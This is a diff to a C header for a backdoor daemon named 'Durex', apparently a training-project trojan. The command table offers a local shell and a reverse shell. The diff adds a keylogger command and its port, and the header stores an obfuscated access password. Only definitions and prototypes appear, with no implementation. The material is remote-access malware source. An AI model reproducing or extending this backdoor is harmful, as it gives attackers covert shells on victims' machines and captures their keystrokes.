@@ -26,12 +26,14 @@
 # define SERVER_REPORTER	"/var/log/Durex.log"
 # define SERVER_PORT		"4242"
 # define SERVER_REMOTE_PORT	"2121"
+# define SERVER_KEYLOG_PORT "1212"
 # define SERVER_CLIENT_MAX	3
 # define SERVER_CLIENT_BUFF	128
 # define SERVER_COMMANDS	{ "?"     , NULL    , "Display this help."   , &serverHelp       , NULL },\
 							{ "shell" , NULL    , "Open a shell."        , &serverShell      , NULL },\
 							{ "rshell", "[port]", "Open a reverse shell.", &serverRemoteShell, NULL },\
-							{ "log"   , NULL    , "Print logs"           , &serverPrintLogs  , NULL },\
+							{ "keylog", "[port]", "Open a keylogger."    , &serverKeylogger  , NULL },\
+							{ "logs"  , NULL    , "Print logs"           , &serverPrintLogs  , NULL },\
 							{ "quit"  , NULL    , "Quit server."         , &serverQuitClient , NULL },\
 							{ NULL, NULL, NULL, NULL, NULL }
 # define SERVER_PASS		201, 121, 30, 74, 3, 83, 154, 250 /* kata */
@@ -87,6 +89,8 @@ int				spawnShell();
 void			serverReadClientShell(t_cl *client);
 void			serverQuitClientShell(t_cl *client, t_cmd *cmds);
 void			serverRemoteShell(t_cl *client, t_cmd *cmds);
+void			serverKeylogger(t_cl *client, t_cmd *cmds);
+int				serverInitKeylogger(int socket);
 void			serverPrintLogs(t_cl *client, t_cmd *cmds);
 void			serverQuitClient(t_cl *client, t_cmd *cmds);
 void			quitClearlyServer();
